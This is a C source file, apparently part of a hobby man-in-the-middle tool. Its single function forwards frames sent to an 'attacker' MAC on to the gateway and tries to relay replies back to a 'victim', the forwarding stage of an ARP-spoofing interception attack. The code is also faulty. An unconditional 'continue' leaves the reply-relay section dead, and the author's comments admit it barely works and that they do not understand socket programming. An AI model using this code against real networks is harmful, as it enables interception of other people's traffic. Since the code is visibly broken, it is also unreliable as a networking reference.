#include "core.h"

void* start_eth_proxy(void* eth_proxy_args) {
    static u8 bytes_buffer[1 << 16];
    ETHProxyArgs* args = (ETHProxyArgs*)eth_proxy_args;
    do {
        // Wait for an incoming packet
        int packet_size = recv(
            args->eth_sock, bytes_buffer, sizeof(bytes_buffer), 0
        );
        if (packet_size == -1) {
            perror("ERROR: start_eth_proxy, failed to recv eth packet");
            continue;
        }

        ether_header* eth_header = (ether_header*)bytes_buffer;

        // Check if the packet is for the target machine
        if (memcmp(
                eth_header->ether_dhost,
                args->attacker_mac.bytes,
                ETHER_ADDR_LEN
            )
            != 0) {
            continue;
        }

        // Modify the packet's destination MAC address to the router's MAC
        // address
        memcpy(
            eth_header->ether_dhost,
            args->gateway_mac.bytes,
            ETHER_ADDR_LEN
        );

        // Modify the packet's source MAC address to the proxy's MAC
        // address
        memcpy(
            eth_header->ether_shost,
            args->attacker_mac.bytes,
            ETHER_ADDR_LEN
        );

        // Send the modified packet to the router
        if (send(args->eth_sock, bytes_buffer, packet_size, 0) == -1) {
            perror("ERROR: start_eth_proxy, failed to send a request to "
                   "the gateway");
            printf("Packet size: %d\n", packet_size);
            continue;
        }

        // For some reason receiving the packet from the router and
        // sending it back to the viction works very bad.
        // But if I don't do it, the victim receive correct responses
        // somehow. I understand nothing in socket programming, sorry...

#if 1
        // Wait for the router's response
        packet_size = recv(
            args->eth_sock, bytes_buffer, sizeof(bytes_buffer), 0
        );
        if (packet_size == -1) {
            perror("ERROR: start_eth_proxy, failed to recv a response "
                   "from the gateway");
            continue;
        }
        continue;

        // Modify the response's source MAC address to the target machine's
        // MAC address
        memcpy(
            eth_header->ether_shost,
            eth_header->ether_dhost,
            ETHER_ADDR_LEN
        );
        memcpy(
            eth_header->ether_dhost, args->victim_mac.bytes, ETHER_ADDR_LEN
        );

        // Send the modified response back to the target machine
        if (send(args->eth_sock, bytes_buffer, packet_size, 0) == -1) {
            perror("ERROR: start_eth_proxy, failed to send a modified "
                   "response to the client");
            continue;
        }
#endif
    } while (args->is_terminated == 0);

    return NULL;
}
